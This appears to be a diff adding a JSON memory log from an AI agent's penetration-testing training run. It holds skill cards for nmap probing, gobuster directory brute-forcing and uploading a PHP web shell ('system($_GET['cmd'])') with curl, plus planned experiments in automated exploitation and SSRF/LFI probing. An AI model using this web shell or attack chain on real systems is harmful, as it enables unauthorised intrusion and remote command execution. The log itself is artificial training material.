@@ -1,0 +1,127 @@
+{
+  "run_id": "run_20260218_111206_abf94f",
+  "timestamp": 1771409533.913341,
+  "key_outcomes": {
+    "wins": [
+      "Maintained situational awareness throughout all 10 mentor calls, documenting observations even though overall success was zero."
+    ],
+    "fails": [
+      "Failed to reach mission success within single episode despite maximum reward accumulation ceiling (60) indicating inability to complete final objective.",
+      "No measurable success rate across episodes suggests inability to convert reconnaissance into exploitation."
+    ],
+    "summary": "Episode completed with solid reconnaissance logging but still unable to translate insights into mission success; need exploit-path refinement."
+  },
+  "repeated_failure_patterns": [
+    {
+      "pattern": "Reconnaissance conducted but no follow-on exploitation was executed after identifying targets, resulting in stalled progress.",
+      "frequency": 5,
+      "evidence_refs": [
+        "run_20260218_111206_abf94f_episode1_step3",
+        "run_20260218_111206_abf94f_episode1_step6"
+      ]
+    }
+  ],
+  "skill_cards": [
+    {
+      "id": "skill_001",
+      "if_condition": "When target network responds positively to TCP SYN on port 80",
+      "then_action": "Run `nmap -p 80 --script=http-headers,http-title` for service identification",
+      "parameters_template": {
+        "port": 80,
+        "script": "http-headers,http-title"
+      },
+      "confidence": 0.68,
+      "evidence_refs": [
+        "run_20260218_111206_abf94f_episode1_step2"
+      ],
+      "created_at": 1771409551.416059,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    },
+    {
+      "id": "skill_002",
+      "if_condition": "When HTTP service reveals default admin page",
+      "then_action": "Execute `gobuster dir -u http://{{target}} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40`",
+      "parameters_template": {
+        "target": "{{target}}",
+        "wordlist": "directory-list-2.3-medium.txt",
+        "threads": 40
+      },
+      "confidence": 0.64,
+      "evidence_refs": [
+        "run_20260218_111206_abf94f_episode1_step4"
+      ],
+      "created_at": 1771409551.4160733,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    },
+    {
+      "id": "skill_003",
+      "if_condition": "When web directory scan uncovers writable upload path",
+      "then_action": "Use `curl` to upload simple web shell and verify execution with `curl http://{{target}}/upload/shell.php`",
+      "parameters_template": {
+        "shell_path": "/upload/shell.php",
+        "payload": "<?php system($_GET['cmd']); ?>"
+      },
+      "confidence": 0.55,
+      "evidence_refs": [
+        "run_20260218_111206_abf94f_episode1_step7"
+      ],
+      "created_at": 1771409551.4160826,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    }
+  ],
+  "memory_ops": [
+    {
+      "operation": "promote",
+      "target": "skill_001",
+      "skill_card_id": "skill_001",
+      "reason": "Consistently applied Nmap service probes with stable results in reconnaissance phase"
+    }
+  ],
+  "next_experiments": [
+    {
+      "title": "Automate exploitation after directory discovery",
+      "description": "Script to tie dirbuster findings directly into a curl-based upload attempt to ensure follow-through from recon to exploitation in same run.",
+      "priority": "high"
+    },
+    {
+      "title": "Service chaining test",
+      "description": "After HTTP service identification, immediately enumerate for SSRF/LFI vectors (using ffuf + custom payloads) to reduce gaps between detection and abuse.",
+      "priority": "medium"
+    },
+    {
+      "title": "Validation checkpoint",
+      "description": "Introduce an automated checkpoint that verifies exploitation success (shell response) before ending episode to ensure completions count as true success.",
+      "priority": "low"
+    }
+  ],
+  "model_used": "gpt-5.1-codex-mini",
+  "dry_run": false,
+  "validation_passed": true
+}
